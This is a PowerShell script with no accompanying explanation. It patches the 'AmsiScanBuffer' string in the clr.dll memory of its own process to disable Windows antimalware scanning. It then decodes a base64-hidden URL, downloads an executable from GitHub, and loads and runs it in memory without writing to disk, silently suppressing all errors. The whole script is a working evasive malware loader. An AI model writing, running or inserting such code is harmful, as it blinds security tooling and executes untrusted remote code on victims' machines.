# Memory protection flags
$mem_flag_01 = 0x02
$mem_flag_02 = 0x04
$mem_flag_03 = 0x40
$mem_flag_04 = 0x20
$mem_flag_05 = 0x100
$mem_flag_06 = 0x1000
$max_path_length = 260

# Memory protection check function
function ValidateMemoryAccess {
    param ($protection_value, $state_value)
    return ((($protection_value -band $mem_flag_01) -eq $mem_flag_01 -or
             ($protection_value -band $mem_flag_02) -eq $mem_flag_02 -or
             ($protection_value -band $mem_flag_03) -eq $mem_flag_03 -or
             ($protection_value -band $mem_flag_04) -eq $mem_flag_04) -and
            ($protection_value -band $mem_flag_05) -ne $mem_flag_05 -and
            ($state_value -band $mem_flag_06) -eq $mem_flag_06)
}

# Pattern matching function
function CompareBytePattern {
    param ($data_buffer, $search_pattern, $start_index)
    for ($position = 0; $position -lt $search_pattern.Length; $position++) {
        if ($data_buffer[$start_index + $position] -ne $search_pattern[$position]) {
            return $false
        }
    }
    return $true
}

try {
    if ($psversiontable.PSVersion.Major -gt 2) {
        # Dynamic assembly for Win32 API
        $dynamic_asm = New-Object System.Reflection.AssemblyName("Win32Api")
        $asm_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($dynamic_asm, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $mod_builder = $asm_builder.DefineDynamicModule("Win32Api", $false)

        # MEMORY_BASIC_INFORMATION structure
        $type_builder = $mod_builder.DefineType("Win32Api.MEMORY_BASIC_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
        [void]$type_builder.DefineField("BaseAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("AllocationBase", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("AllocationProtect", [Int32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("RegionSize", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("State", [Int32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("Protect", [Int32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("Type", [Int32], [System.Reflection.FieldAttributes]::Public)
        $mem_basic_info = $type_builder.CreateType()

        # SYSTEM_INFO structure
        $type_builder = $mod_builder.DefineType("Win32Api.SYSTEM_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
        [void]$type_builder.DefineField("wProcessorArchitecture", [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("wReserved", [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("dwPageSize", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("lpMinimumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("lpMaximumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("dwActiveProcessorMask", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("dwNumberOfProcessors", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("dwProcessorType", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("dwAllocationGranularity", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("wProcessorLevel", [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("wProcessorRevision", [UInt16], [System.Reflection.FieldAttributes]::Public)
        $sys_info_struct = $type_builder.CreateType()

        # Kernel32 methods
        $type_builder = $mod_builder.DefineType("Win32Api.Kernel32", "Public, Class")
        $dllimport_ctor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $setlasterror_field = [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError")
        $custom_attr = New-Object Reflection.Emit.CustomAttributeBuilder($dllimport_ctor, "kernel32.dll", [Reflection.FieldInfo[]]@($setlasterror_field), @($true))

        # Define PInvoke methods
        $methods = @(
            @("VirtualProtect", "kernel32.dll", [bool], @([IntPtr], [IntPtr], [Int32], [Int32].MakeByRefType())),
            @("GetCurrentProcess", "kernel32.dll", [IntPtr], @()),
            @("VirtualQuery", "kernel32.dll", [IntPtr], @([IntPtr], [Win32Api.MEMORY_BASIC_INFO].MakeByRefType(), [uint32])),
            @("GetSystemInfo", "kernel32.dll", [void], @([Win32Api.SYSTEM_INFO].MakeByRefType())),
            @("GetMappedFileName", "psapi.dll", [Int32], @([IntPtr], [IntPtr], [System.Text.StringBuilder], [uint32])),
            @("ReadProcessMemory", "kernel32.dll", [Int32], @([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType())),
            @("WriteProcessMemory", "kernel32.dll", [Int32], @([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()))
        )

        foreach ($method in $methods) {
            $pinvoke_method = $type_builder.DefinePInvokeMethod($method[0], $method[1],
                ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
                [Reflection.CallingConventions]::Standard, $method[2],
                $method[3],
                [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
            $pinvoke_method.SetCustomAttribute($custom_attr)
        }

        $kernel32_type = $type_builder.CreateType()

        # Obfuscated signature search
        $search_pattern_bytes = [System.Text.Encoding]::UTF8.GetBytes('AmsiScanBuffer')

        $process_handle = [Win32Api.Kernel32]::GetCurrentProcess()
        $system_info = New-Object Win32Api.SYSTEM_INFO
        [void][Win32Api.Kernel32]::GetSystemInfo([ref]$system_info)
        
        $memory_regions = @()
        $current_address = [IntPtr]::Zero
        
        while ($current_address.ToInt64() -lt $system_info.lpMaximumApplicationAddress.ToInt64()) {
            $mem_info = New-Object Win32Api.MEMORY_BASIC_INFO
            if ([Win32Api.Kernel32]::VirtualQuery($current_address, [ref]$mem_info, [System.Runtime.InteropServices.Marshal]::SizeOf($mem_info))) {
                $memory_regions += $mem_info
            }
            $current_address = New-Object IntPtr($mem_info.BaseAddress.ToInt64() + $mem_info.RegionSize.ToInt64())
        }

        foreach ($region in $memory_regions) {
            if (-not (ValidateMemoryAccess $region.Protect $region.State)) {
                continue
            }
            
            $path_builder = New-Object System.Text.StringBuilder $max_path_length
            if ([Win32Api.Kernel32]::GetMappedFileName($process_handle, $region.BaseAddress, $path_builder, $max_path_length) -gt 0) {
                $file_path = $path_builder.ToString()
                if ($file_path.EndsWith("clr.dll", [StringComparison]::InvariantCultureIgnoreCase)) {
                    $buffer_data = New-Object byte[] $region.RegionSize.ToInt64()
                    $read_bytes = 0
                    [void][Win32Api.Kernel32]::ReadProcessMemory($process_handle, $region.BaseAddress, $buffer_data, $buffer_data.Length, [ref]$read_bytes)
                    
                    for ($index = 0; $index -lt ($read_bytes - $search_pattern_bytes.Length); $index++) {
                        $pattern_found = $true
                        for ($pattern_index = 0; $pattern_index -lt $search_pattern_bytes.Length; $pattern_index++) {
                            if ($buffer_data[$index + $pattern_index] -ne $search_pattern_bytes[$pattern_index]) {
                                $pattern_found = $false
                                break
                            }
                        }
                        
                        if ($pattern_found) {
                            $old_protection = 0
                            if (($region.Protect -band $mem_flag_02) -ne $mem_flag_02) {
                                [void][Win32Api.Kernel32]::VirtualProtect($region.BaseAddress, $buffer_data.Length, $mem_flag_03, [ref]$old_protection)
                            }
                            
                            $empty_bytes = New-Object byte[] $search_pattern_bytes.Length
                            $written_bytes = 0
                            [void][Win32Api.Kernel32]::WriteProcessMemory($process_handle, [IntPtr]::Add($region.BaseAddress, $index), $empty_bytes, $empty_bytes.Length, [ref]$written_bytes)
                            
                            if (($region.Protect -band $mem_flag_02) -ne $mem_flag_02) {
                                [void][Win32Api.Kernel32]::VirtualProtect($region.BaseAddress, $buffer_data.Length, $region.Protect, [ref]$old_protection)
                            }
                        }
                    }
                }
            }
        }
    }

    # O
    $download_url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL1RoZU1vY2thL1NJR09SVEEtT1RFTC9yYXcvcmVmcy9oZWFkcy9tYWluL1NJR09SVEEuZXhl'))
    
    Add-Type -AssemblyName System.Net.Http
    $http_client = [System.Net.Http.HttpClient]::new()

    $download_task = $http_client.GetByteArrayAsync($download_url)
    $download_task.Wait()
    $assembly_bytes = $download_task.Result

    # Belleğe yükle - DISKE YAZMA YOK
    $loaded_assembly = [System.Reflection.Assembly]::Load([byte[]]$assembly_bytes)
    $entry_point = $loaded_assembly.EntryPoint

    if ($null -ne $entry_point) {
        $parameters = $entry_point.GetParameters()
        if ($parameters.Count -eq 0) {
            $entry_point.Invoke($null, $null)
        } else {
            $invoke_args = New-Object Object[] $parameters.Count
            for ($i = 0; $i -lt $parameters.Count; $i++) {
                if ($parameters[$i].ParameterType -eq [string[]]) {
                    $invoke_args[$i] = [string[]]@()
                } else {
                    $invoke_args[$i] = $null
                }
            }
            $entry_point.Invoke($null, $invoke_args)
        }
    } else {
        Write-Warning "Entry point not found!"
    }
}
catch {
    # Hata mesajını gizle
    # Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}

# Son mesajı gizle
# Write-Host "Process completed. Press any key to close..." -ForegroundColor Green
# $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")